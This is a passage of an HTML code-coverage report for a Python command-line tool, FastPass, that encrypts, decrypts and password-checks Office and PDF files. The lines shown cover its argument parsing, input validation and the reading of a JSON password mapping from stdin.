    <p class="pln"><span class="n"><a id="t99" href="#t99">99</a></span><span class="t">    <span class="com"># Support password file and JSON stdin options</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t100" href="#t100">100</a></span><span class="t">    <span class="nam">parser</span><span class="op">.</span><span class="nam">add_argument</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t101" href="#t101">101</a></span><span class="t">        <span class="str">'-p'</span><span class="op">,</span> <span class="str">'--password'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t102" href="#t102">102</a></span><span class="t">        <span class="nam">nargs</span><span class="op">=</span><span class="str">'+'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t103" href="#t103">103</a></span><span class="t">        <span class="nam">help</span><span class="op">=</span><span class="str">'Passwords to try (space-delimited, quotes for spaces, or "stdin" for JSON)'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t104" href="#t104">104</a></span><span class="t">    <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t105" href="#t105">105</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t106" href="#t106">106</a></span><span class="t">    <span class="nam">parser</span><span class="op">.</span><span class="nam">add_argument</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t107" href="#t107">107</a></span><span class="t">        <span class="str">'--password-list'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t108" href="#t108">108</a></span><span class="t">        <span class="nam">type</span><span class="op">=</span><span class="nam">Path</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t109" href="#t109">109</a></span><span class="t">        <span class="nam">help</span><span class="op">=</span><span class="str">'Text file with passwords to try (one per line)'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t110" href="#t110">110</a></span><span class="t">    <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t111" href="#t111">111</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t112" href="#t112">112</a></span><span class="t">    <span class="com"># A1f: Set Output Location Options</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t113" href="#t113">113</a></span><span class="t">    <span class="com"># Choose where processed files should be saved</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t114" href="#t114">114</a></span><span class="t">    <span class="com"># Default: replace original files in same location</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t115" href="#t115">115</a></span><span class="t">    <span class="nam">parser</span><span class="op">.</span><span class="nam">add_argument</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t116" href="#t116">116</a></span><span class="t">        <span class="str">'-o'</span><span class="op">,</span> <span class="str">'--output-dir'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t117" href="#t117">117</a></span><span class="t">        <span class="nam">type</span><span class="op">=</span><span class="nam">Path</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t118" href="#t118">118</a></span><span class="t">        <span class="nam">help</span><span class="op">=</span><span class="str">'Output directory (default: in-place modification)'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t119" href="#t119">119</a></span><span class="t">    <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t120" href="#t120">120</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t121" href="#t121">121</a></span><span class="t">    <span class="com"># A1g: Add Helper Features</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t122" href="#t122">122</a></span><span class="t">    <span class="nam">parser</span><span class="op">.</span><span class="nam">add_argument</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t123" href="#t123">123</a></span><span class="t">        <span class="str">'--dry-run'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t124" href="#t124">124</a></span><span class="t">        <span class="nam">action</span><span class="op">=</span><span class="str">'store_true'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t125" href="#t125">125</a></span><span class="t">        <span class="nam">help</span><span class="op">=</span><span class="str">'Show what would be done without making changes'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t126" href="#t126">126</a></span><span class="t">    <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t127" href="#t127">127</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t128" href="#t128">128</a></span><span class="t">    <span class="nam">parser</span><span class="op">.</span><span class="nam">add_argument</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t129" href="#t129">129</a></span><span class="t">        <span class="str">'--verify'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t130" href="#t130">130</a></span><span class="t">        <span class="nam">action</span><span class="op">=</span><span class="str">'store_true'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t131" href="#t131">131</a></span><span class="t">        <span class="nam">help</span><span class="op">=</span><span class="str">'Deep verification of processed files'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t132" href="#t132">132</a></span><span class="t">    <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t133" href="#t133">133</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t134" href="#t134">134</a></span><span class="t">    <span class="nam">parser</span><span class="op">.</span><span class="nam">add_argument</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t135" href="#t135">135</a></span><span class="t">        <span class="str">'--debug'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t136" href="#t136">136</a></span><span class="t">        <span class="nam">action</span><span class="op">=</span><span class="str">'store_true'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t137" href="#t137">137</a></span><span class="t">        <span class="nam">help</span><span class="op">=</span><span class="str">'Enable detailed logging and debug output'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t138" href="#t138">138</a></span><span class="t">    <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t139" href="#t139">139</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t140" href="#t140">140</a></span><span class="t">    <span class="nam">parser</span><span class="op">.</span><span class="nam">add_argument</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t141" href="#t141">141</a></span><span class="t">        <span class="str">'--log-file'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t142" href="#t142">142</a></span><span class="t">        <span class="nam">type</span><span class="op">=</span><span class="nam">Path</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t143" href="#t143">143</a></span><span class="t">        <span class="nam">help</span><span class="op">=</span><span class="str">'Log file path for detailed logging'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t144" href="#t144">144</a></span><span class="t">    <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t145" href="#t145">145</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t146" href="#t146">146</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t147" href="#t147">147</a></span><span class="t"><span class="key">def</span> <span class="nam">display_information_and_exit</span><span class="op">(</span><span class="nam">args</span><span class="op">:</span> <span class="nam">argparse</span><span class="op">.</span><span class="nam">Namespace</span><span class="op">)</span> <span class="op">-></span> <span class="nam">int</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t148" href="#t148">148</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t149" href="#t149">149</a></span><span class="t"><span class="str">    A1i: Handle Information Requests</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t150" href="#t150">150</a></span><span class="t"><span class="str">    Check if user wants to see supported file formats</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t151" href="#t151">151</a></span><span class="t"><span class="str">    Show list and exit if that's all they wanted</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t152" href="#t152">152</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t153" href="#t153">153</a></span><span class="t">    <span class="key">if</span> <span class="nam">getattr</span><span class="op">(</span><span class="nam">args</span><span class="op">,</span> <span class="str">'list_supported'</span><span class="op">,</span> <span class="key">False</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t154" href="#t154">154</a></span><span class="t">        <span class="com"># A1i_List: Show Supported File Types</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t155" href="#t155">155</a></span><span class="t">        <span class="nam">print</span><span class="op">(</span><span class="str">"FastPass Supported File Formats:"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t156" href="#t156">156</a></span><span class="t">        <span class="nam">print</span><span class="op">(</span><span class="str">"\nModern Office Documents (experimental encryption, full decryption):"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t157" href="#t157">157</a></span><span class="t">        <span class="nam">office_formats</span> <span class="op">=</span> <span class="op">[</span><span class="nam">ext</span> <span class="key">for</span> <span class="nam">ext</span><span class="op">,</span> <span class="nam">tool</span> <span class="key">in</span> <span class="nam">FastPassConfig</span><span class="op">.</span><span class="nam">SUPPORTED_FORMATS</span><span class="op">.</span><span class="nam">items</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t158" href="#t158">158</a></span><span class="t">                         <span class="key">if</span> <span class="nam">tool</span> <span class="op">==</span> <span class="str">'msoffcrypto'</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t159" href="#t159">159</a></span><span class="t">        <span class="key">for</span> <span class="nam">fmt</span> <span class="key">in</span> <span class="nam">sorted</span><span class="op">(</span><span class="nam">office_formats</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t160" href="#t160">160</a></span><span class="t">            <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">  </span><span class="op">{</span><span class="nam">fmt</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t161" href="#t161">161</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t162" href="#t162">162</a></span><span class="t">        <span class="nam">print</span><span class="op">(</span><span class="str">"\nPDF Documents (full encryption and decryption support):"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t163" href="#t163">163</a></span><span class="t">        <span class="nam">pdf_formats</span> <span class="op">=</span> <span class="op">[</span><span class="nam">ext</span> <span class="key">for</span> <span class="nam">ext</span><span class="op">,</span> <span class="nam">tool</span> <span class="key">in</span> <span class="nam">FastPassConfig</span><span class="op">.</span><span class="nam">SUPPORTED_FORMATS</span><span class="op">.</span><span class="nam">items</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t164" href="#t164">164</a></span><span class="t">                      <span class="key">if</span> <span class="nam">tool</span> <span class="op">==</span> <span class="str">'PyPDF2'</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t165" href="#t165">165</a></span><span class="t">        <span class="key">for</span> <span class="nam">fmt</span> <span class="key">in</span> <span class="nam">sorted</span><span class="op">(</span><span class="nam">pdf_formats</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t166" href="#t166">166</a></span><span class="t">            <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">  </span><span class="op">{</span><span class="nam">fmt</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t167" href="#t167">167</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t168" href="#t168">168</a></span><span class="t">        <span class="nam">print</span><span class="op">(</span><span class="str">"\nLegacy Office Formats (NOT SUPPORTED):"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t169" href="#t169">169</a></span><span class="t">        <span class="nam">print</span><span class="op">(</span><span class="str">"  .doc, .xls, .ppt (use Office to convert to modern format)"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t170" href="#t170">170</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t171" href="#t171">171</a></span><span class="t">        <span class="key">return</span> <span class="num">0</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t172" href="#t172">172</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t173" href="#t173">173</a></span><span class="t">    <span class="key">return</span> <span class="num">0</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t174" href="#t174">174</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t175" href="#t175">175</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t176" href="#t176">176</a></span><span class="t"><span class="key">def</span> <span class="nam">validate_arguments</span><span class="op">(</span><span class="nam">args</span><span class="op">:</span> <span class="nam">argparse</span><span class="op">.</span><span class="nam">Namespace</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t177" href="#t177">177</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t178" href="#t178">178</a></span><span class="t"><span class="str">    A2a: Check Input Requirements</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t179" href="#t179">179</a></span><span class="t"><span class="str">    User must specify either files or folder to process</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t180" href="#t180">180</a></span><span class="t"><span class="str">    Cannot proceed without something to work on</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t181" href="#t181">181</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t182" href="#t182">182</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t183" href="#t183">183</a></span><span class="t">    <span class="com"># Skip validation for info commands</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t184" href="#t184">184</a></span><span class="t">    <span class="key">if</span> <span class="nam">getattr</span><span class="op">(</span><span class="nam">args</span><span class="op">,</span> <span class="str">'list_supported'</span><span class="op">,</span> <span class="key">False</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t185" href="#t185">185</a></span><span class="t">        <span class="key">return</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t186" href="#t186">186</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t187" href="#t187">187</a></span><span class="t">    <span class="com"># Must have an operation for non-info commands</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t188" href="#t188">188</a></span><span class="t">    <span class="key">if</span> <span class="key">not</span> <span class="nam">args</span><span class="op">.</span><span class="nam">operation</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t189" href="#t189">189</a></span><span class="t">        <span class="key">raise</span> <span class="nam">ValueError</span><span class="op">(</span><span class="str">"Must specify an operation (encrypt, decrypt, or check-password)"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t190" href="#t190">190</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t191" href="#t191">191</a></span><span class="t">    <span class="com"># A2a_Check: Valid Input Method Provided?</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t192" href="#t192">192</a></span><span class="t">    <span class="nam">has_files</span> <span class="op">=</span> <span class="nam">hasattr</span><span class="op">(</span><span class="nam">args</span><span class="op">,</span> <span class="str">'input'</span><span class="op">)</span> <span class="key">and</span> <span class="nam">args</span><span class="op">.</span><span class="nam">input</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t193" href="#t193">193</a></span><span class="t">    <span class="nam">has_recursive</span> <span class="op">=</span> <span class="nam">hasattr</span><span class="op">(</span><span class="nam">args</span><span class="op">,</span> <span class="str">'recursive'</span><span class="op">)</span> <span class="key">and</span> <span class="nam">args</span><span class="op">.</span><span class="nam">recursive</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t194" href="#t194">194</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t195" href="#t195">195</a></span><span class="t">    <span class="key">if</span> <span class="key">not</span> <span class="nam">has_files</span> <span class="key">and</span> <span class="key">not</span> <span class="nam">has_recursive</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t196" href="#t196">196</a></span><span class="t">        <span class="com"># A2a_Error: Nothing to Process</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t197" href="#t197">197</a></span><span class="t">        <span class="key">raise</span> <span class="nam">ValueError</span><span class="op">(</span><span class="str">"Must specify either files (-i) or recursive directory (-r)"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t198" href="#t198">198</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t199" href="#t199">199</a></span><span class="t">    <span class="key">if</span> <span class="nam">has_files</span> <span class="key">and</span> <span class="nam">has_recursive</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t200" href="#t200">200</a></span><span class="t">        <span class="com"># A2a_Both_Error: Conflicting Instructions</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t201" href="#t201">201</a></span><span class="t">        <span class="key">raise</span> <span class="nam">ValueError</span><span class="op">(</span><span class="str">"Cannot specify both individual files and recursive directory"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t202" href="#t202">202</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t203" href="#t203">203</a></span><span class="t">    <span class="com"># A2a1: Validate Recursive Mode Usage</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t204" href="#t204">204</a></span><span class="t">    <span class="com"># Check if recursive mode used with encrypt operation</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t205" href="#t205">205</a></span><span class="t">    <span class="com"># Recursive mode only allowed with decrypt/check-password</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t206" href="#t206">206</a></span><span class="t">    <span class="key">if</span> <span class="nam">has_recursive</span> <span class="key">and</span> <span class="nam">args</span><span class="op">.</span><span class="nam">operation</span> <span class="op">==</span> <span class="str">'encrypt'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t207" href="#t207">207</a></span><span class="t">        <span class="com"># A2a1_Error: Recursive Encryption Blocked</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t208" href="#t208">208</a></span><span class="t">        <span class="key">raise</span> <span class="nam">ValueError</span><span class="op">(</span><span class="str">"Recursive mode only supported for decrypt operations (security restriction)"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t209" href="#t209">209</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t210" href="#t210">210</a></span><span class="t">    <span class="com"># Validate password requirements</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t211" href="#t211">211</a></span><span class="t">    <span class="nam">has_passwords</span> <span class="op">=</span> <span class="op">(</span><span class="nam">hasattr</span><span class="op">(</span><span class="nam">args</span><span class="op">,</span> <span class="str">'password'</span><span class="op">)</span> <span class="key">and</span> <span class="nam">args</span><span class="op">.</span><span class="nam">password</span><span class="op">)</span> <span class="key">or</span> <span class="xx">\</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t212" href="#t212">212</a></span><span class="t">                   <span class="op">(</span><span class="nam">hasattr</span><span class="op">(</span><span class="nam">args</span><span class="op">,</span> <span class="str">'password_list'</span><span class="op">)</span> <span class="key">and</span> <span class="nam">args</span><span class="op">.</span><span class="nam">password_list</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t213" href="#t213">213</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t214" href="#t214">214</a></span><span class="t">    <span class="key">if</span> <span class="key">not</span> <span class="nam">has_passwords</span> <span class="key">and</span> <span class="nam">args</span><span class="op">.</span><span class="nam">operation</span> <span class="op">!=</span> <span class="str">'check-password'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t215" href="#t215">215</a></span><span class="t">        <span class="key">raise</span> <span class="nam">ValueError</span><span class="op">(</span><span class="str">"Must specify passwords (-p) or password list (--password-list)"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t216" href="#t216">216</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t217" href="#t217">217</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t218" href="#t218">218</a></span><span class="t"><span class="key">def</span> <span class="nam">handle_stdin_passwords</span><span class="op">(</span><span class="nam">args</span><span class="op">:</span> <span class="nam">argparse</span><span class="op">.</span><span class="nam">Namespace</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t219" href="#t219">219</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t220" href="#t220">220</a></span><span class="t"><span class="str">    A3d: Handle Stdin Password Input</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t221" href="#t221">221</a></span><span class="t"><span class="str">    Check for 'stdin' in CLI passwords</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t222" href="#t222">222</a></span><span class="t"><span class="str">    Parse JSON password mapping from stdin if specified</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t223" href="#t223">223</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t224" href="#t224">224</a></span><span class="t">    <span class="key">if</span> <span class="nam">hasattr</span><span class="op">(</span><span class="nam">args</span><span class="op">,</span> <span class="str">'password'</span><span class="op">)</span> <span class="key">and</span> <span class="nam">args</span><span class="op">.</span><span class="nam">password</span> <span class="key">and</span> <span class="str">'stdin'</span> <span class="key">in</span> <span class="nam">args</span><span class="op">.</span><span class="nam">password</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t225" href="#t225">225</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t226" href="#t226">226</a></span><span class="t">            <span class="com"># Read JSON from stdin</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t227" href="#t227">227</a></span><span class="t">            <span class="nam">stdin_data</span> <span class="op">=</span> <span class="nam">sys</span><span class="op">.</span><span class="nam">stdin</span><span class="op">.</span><span class="nam">read</span><span class="op">(</span><span class="op">)</span><span class="op">.</span><span class="nam">strip</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t228" href="#t228">228</a></span><span class="t">            <span class="key">if</span> <span class="nam">stdin_data</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t229" href="#t229">229</a></span><span class="t">                <span class="nam">password_mapping</span> <span class="op">=</span> <span class="nam">json</span><span class="op">.</span><span class="nam">loads</span><span class="op">(</span><span class="nam">stdin_data</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t230" href="#t230">230</a></span><span class="t">                <span class="com"># Store the mapping for later use</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t231" href="#t231">231</a></span><span class="t">                <span class="nam">args</span><span class="op">.</span><span class="nam">stdin_password_mapping</span> <span class="op">=</span> <span class="nam">password_mapping</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t232" href="#t232">232</a></span><span class="t">                <span class="com"># Remove 'stdin' from password list</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t233" href="#t233">233</a></span><span class="t">                <span class="nam">args</span><span class="op">.</span><span class="nam">password</span> <span class="op">=</span> <span class="op">[</span><span class="nam">p</span> <span class="key">for</span> <span class="nam">p</span> <span class="key">in</span> <span class="nam">args</span><span class="op">.</span><span class="nam">password</span> <span class="key">if</span> <span class="nam">p</span> <span class="op">!=</span> <span class="str">'stdin'</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t234" href="#t234">234</a></span><span class="t">        <span class="key">except</span> <span class="nam">json</span><span class="op">.</span><span class="nam">JSONDecodeError</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t235" href="#t235">235</a></span><span class="t">            <span class="key">raise</span> <span class="nam">ValueError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Invalid JSON in stdin: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t236" href="#t236">236</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t237" href="#t237">237</a></span><span class="t">            <span class="key">raise</span> <span class="nam">ValueError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Error reading passwords from stdin: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t238" href="#t238">238</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t239" href="#t239">239</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t240" href="#t240">240</a></span><span class="t"><span class="key">def</span> <span class="nam">main</span><span class="op">(</span><span class="op">)</span> <span class="op">-></span> <span class="nam">int</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t241" href="#t241">241</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t242" href="#t242">242</a></span><span class="t"><span class="str">    Main Control Center</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t243" href="#t243">243</a></span><span class="t"><span class="str">    Sets up error handling for entire program</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t244" href="#t244">244</a></span><span class="t"><span class="str">    Prepares to read user's command-line instructions</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t245" href="#t245">245</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t246" href="#t246">246</a></span><span class="t">    <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
